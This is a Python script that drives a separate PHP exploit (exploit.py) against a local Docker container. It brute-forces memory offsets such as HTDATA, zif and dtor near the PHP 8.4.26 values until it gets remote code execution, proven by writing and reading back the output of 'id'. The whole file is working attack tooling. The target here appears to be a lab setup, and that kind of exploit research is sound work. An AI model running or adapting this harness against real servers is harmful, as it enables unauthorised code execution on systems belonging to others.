import subprocess, sys, time, os

BASE = r"C:\Users\likat\p2s52704"
c, port = "p2s8335", "18112"
zif, dtor = "0x3ac080", "0x49ec50"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def clean():
    sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 2>/dev/null"')
    sh(f'docker restart {c}')
    time.sleep(3.0)

def run(htdata_off):
    clean()
    cmd = [sys.executable, BASE + r"\exploit.py",
           "-u", f"http://127.0.0.1:{port}/index.php",
           "--profile", "bookworm",
           "--zif-offset", zif, "--dtor-offset", dtor,
           "--htdata-offset", htdata_off,
           "--retries", "1",
           "-c", "id>/www/p1", "--fetch", "/www/p1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT"
    ok = "uid=33" in out
    stage = "stage1"
    if "stage 2" in out: stage = "stage2"
    if "stage 3" in out: stage = "stage3"
    chunk = "no"
    libbase = "no"
    for line in out.splitlines():
        if "chunk base" in line: chunk = line.strip()
        if "libphp base" in line: libbase = line.strip()
    return ok, stage, chunk, libbase, out

# Try a range of HTDATA_OFFSETs around the 8.4.26 value (0x690d8)
offsets = ["0x690d8", "0x680d8", "0x6a0d8", "0x670d8", "0x6b0d8",
           "0x660d8", "0x6c0d8", "0x650d8", "0x6d0d8", "0x640d8"]

for off in offsets:
    ok, stage, chunk, libbase, out = run(off)
    print(f"HTDATA={off}: {'*** RCE ***' if ok else 'no'} (reached {stage}) | {chunk} | {libbase}", flush=True)
    if ok:
        print("  proof:", sh(f'docker exec {c} cat /www/p1').stdout.strip()[:80])
        break
